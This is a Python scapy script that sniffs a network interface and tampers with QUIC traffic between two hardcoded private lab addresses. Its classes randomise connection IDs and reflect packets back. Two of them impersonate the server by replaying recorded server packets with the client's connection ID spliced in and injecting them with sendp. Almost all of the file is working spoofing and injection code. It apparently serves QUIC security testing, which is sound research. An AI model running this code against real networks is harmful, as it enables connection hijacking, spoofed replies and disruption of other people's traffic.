#!/usr/bin/env python3

import argparse
import binascii
import scapy
from scapy.all import *
import struct

def print_raw_quic(packet):
    r = packet[Raw].load
    pkt_info = format(r[0], 'b').zfill(8)
    form = pkt_info[0]
    if form == "1":
        fixed = pkt_info[1]
        pkt_type = pkt_info[2:4]
        reserved = pkt_info[4:6]
        pkn_len = pkt_info[6:]
        version = r[1:5].hex()
        dcID_len = r[5]
        dcID = r[6:6 + dcID_len].hex()
        ptr = 6 + dcID_len
        scID_len = r[ptr]
        ptr += 1
        scID = r[ptr:ptr + scID_len].hex()

        print("PACKET")
        print(f"form =     {form}")
        print(f"fixed =    {fixed}")
        print(f"pkt_type = {pkt_type}")
        print(f"reserved = {reserved}")
        print(f"pkn_len =  {pkn_len}")
        print(f"version =  {version}")
        print(f"dcID_len = {dcID_len}")
        print(f"dcID =     {dcID}")
        print(f"scID_len = {scID_len}")
        print(f"scID =     {scID}")
        print()

class ClientIntercept:
    def __init__(self):
        pass
    
    def __call__(self, packet):
        # if self.args.verbose:
        #     packet.show()
        # else:
        #print(packet.summary())

        if IP in packet and TCP not in packet:
            src=packet[IP].src
            dst=packet[IP].dst
            if str(src) == "192.168.100.51" and str(dst) == "192.168.100.52":
                self.randomise_dcid(packet)

    def randomise_dcid(self, packet):
        r = packet.lastlayer().load
        pkt_info = format(r[0], 'b').zfill(8)
        form = pkt_info[0]
        if form == "1":
            dcID_len = r[5]
            dcID = os.urandom(dcID_len) 
            ptr = 6 + dcID_len
            scID_len = r[ptr]
            ptr += 1
            scID = r[ptr: ptr + scID_len]
            ptr += scID_len
            rl = r[:5]
            rm = scID_len.to_bytes(1, "big") + scID + dcID_len.to_bytes(1, "big") + dcID
            rr = r[ptr:]
            r = rl + rm + rr
            packet[Raw].load = r
            packet[UDP].sport, packet[UDP].dport = packet[UDP].dport, packet[UDP].sport
            packet[IP].src, packet[IP].dst = packet[IP].dst, packet[IP].src
            packet[Ether].src, packet[Ether].dst = packet[Ether].dst, packet[Ether].src
            #self.print_raw_quic(packet)
            del packet.chksum
            packet = packet.__class__(bytes(packet))
            #packet.show()
            sendp(packet, "enp6s0")

    def run_forever(self):
        sniff(iface="enp6s0", prn=self, store=0)

class ServerIntercept:
    def __init__(self):
        pass
    
    def __call__(self, packet):
        if IP in packet and TCP not in packet:
            src=packet[IP].src
            dst=packet[IP].dst
            if str(dst) == "192.168.100.52" and str(src) == "192.168.100.51": 
                self.randomise_scid(packet)

    def randomise_scid(self, packet):
        r = packet.lastlayer().load
        pkt_info = format(r[0], 'b').zfill(8)
        form = pkt_info[0]
        if form == "1":
            dcID_len = r[5]
            dcID = r[6: 6 + dcID_len]
            ptr = 6 + dcID_len
            scID_len = r[ptr]
            ptr += 1
            scID = os.urandom(scID_len) 
            ptr += scID_len
            rl = r[:5]
            rm = scID_len.to_bytes(1, "big") + scID + dcID_len.to_bytes(1, "big") + dcID
            rr = r[ptr:]
            r = rl + rm + rr
            packet[Raw].load = r
            packet[UDP].sport, packet[UDP].dport = packet[UDP].dport, packet[UDP].sport
            packet[IP].src, packet[IP].dst = packet[IP].dst, packet[IP].src
            packet[Ether].src, packet[Ether].dst = packet[Ether].dst, packet[Ether].src
            #print_raw_quic(packet)
            del packet.chksum
            packet = packet.__class__(bytes(packet))
            #packet.show()
            sendp(packet, "enp6s0")

    def run_forever(self):
        sniff(iface="enp6s0", prn=self, store=0)

class RandomServerImpersonation:
    def __init__(self):
        self.last_server_packet = []
    
    def __call__(self, packet):
        # if self.args.verbose:
        #     packet.show()
        # else:
        #print(packet.summary())

        if IP in packet and TCP not in packet:
            src=packet[IP].src
            dst=packet[IP].dst
            if str(src) == "192.168.100.52" and str(dst) == "192.168.100.51":
                self.record_server_packet(packet)
            elif str(src) == "192.168.100.51" and str(dst) == "192.168.100.52":
                self.fake_server_reply(packet)

    def record_server_packet(self, packet):
        r = packet.lastlayer().load
        pkt_info = format(r[0], 'b').zfill(8)
        form = pkt_info[0]
        if form == "1":
            #packet.show()
            #print_raw_quic(packet)
            self.last_server_packet.append(packet)

    def fake_server_reply(self, client_packet):
        if len(self.last_server_packet) > 0:
            ind = random.randint(0, len(self.last_server_packet) - 1)
            server_packet = self.last_server_packet[ind]
            server_packet = self.copy_scid(client_packet, server_packet)
            if server_packet:
                sendp(server_packet, "enp6s0")

    def copy_scid(self, src, dst):
        r = src.lastlayer().load
        pkt_info = format(r[0], 'b').zfill(8)
        form = pkt_info[0]
        if form == "1":
            #print_raw_quic(src)
            dcID_len = r[5]
            dcID = r[6: 6 + dcID_len]
            ptr = 6 + dcID_len
            scID_len = r[ptr]
            ptr += 1
            scID = r[ptr: ptr + scID_len]
            #print(scID.hex())
        
            r = dst.lastlayer().load
            pkt_info = format(r[0], 'b').zfill(8)
            form = pkt_info[0]
            if form == "1":
                dcID_len = r[5]
                dcID = r[6: 6 + dcID_len]
                ptr = 6 + dcID_len
                dst_scID_len = r[ptr]
                ptr += 1 + dst_scID_len
                rl = r[:5]
                rm = scID_len.to_bytes(1, "big") + scID + dcID_len.to_bytes(1, "big") + dcID
                rr = r[ptr:]
                r = rl + rm + rr
                dst[Raw].load = r
                dst[UDP].sport, dst[UDP].dport = src[UDP].dport, src[UDP].sport
                del dst[IP].len
                del dst[UDP].len
                del dst.chksum
                dst = dst.__class__(bytes(dst))
                return dst
        return None

    def run_forever(self):
        sniff(iface="enp6s0", prn=self, store=0)


class ServerImpersonation:
    def __init__(self):
        self.last_server_packet = []
    
    def __call__(self, packet):
        # if self.args.verbose:
        #     packet.show()
        # else:
        #print(packet.summary())

        if IP in packet and TCP not in packet:
            src=packet[IP].src
            dst=packet[IP].dst
            if str(src) == "192.168.100.52" and str(dst) == "192.168.100.51":
                self.record_server_packet(packet)
            elif str(src) == "192.168.100.51" and str(dst) == "192.168.100.52":
                self.fake_server_reply(packet)

    def record_server_packet(self, packet):
        r = packet.lastlayer().load
        pkt_info = format(r[0], 'b').zfill(8)
        form = pkt_info[0]
        if form == "1":
            #packet.show()
            #print_raw_quic(packet)
            self.last_server_packet.append(packet)

    def fake_server_reply(self, client_packet):
        if len(self.last_server_packet) > 0:
            server_packet = self.last_server_packet[-1]
            server_packet = self.copy_scid(client_packet, server_packet)
            if server_packet:
                sendp(server_packet, "enp6s0")

    def copy_scid(self, src, dst):
        r = src.lastlayer().load
        pkt_info = format(r[0], 'b').zfill(8)
        form = pkt_info[0]
        if form == "1":
            #print_raw_quic(src)
            dcID_len = r[5]
            dcID = r[6: 6 + dcID_len]
            ptr = 6 + dcID_len
            scID_len = r[ptr]
            ptr += 1
            scID = r[ptr: ptr + scID_len]
            #print(scID.hex())
        
            r = dst.lastlayer().load
            pkt_info = format(r[0], 'b').zfill(8)
            form = pkt_info[0]
            if form == "1":
                dcID_len = r[5]
                dcID = r[6: 6 + dcID_len]
                ptr = 6 + dcID_len
                dst_scID_len = r[ptr]
                ptr += 1 + dst_scID_len
                rl = r[:5]
                rm = scID_len.to_bytes(1, "big") + scID + dcID_len.to_bytes(1, "big") + dcID
                rr = r[ptr:]
                r = rl + rm + rr
                dst[Raw].load = r
                dst[UDP].sport, dst[UDP].dport = src[UDP].dport, src[UDP].sport
                del dst[IP].len
                del dst[UDP].len
                del dst.chksum
                dst = dst.__class__(bytes(dst))
                return dst
        return None

    def run_forever(self):
        sniff(iface="enp6s0", prn=self, store=0)


if __name__ == "__main__":
    #sniffer = ClientIntercept()
    #sniffer = ServerIntercept()
    #sniffer = RandomServerImpersonation()
    sniffer = ServerImpersonation()
    sniffer.run_forever()

    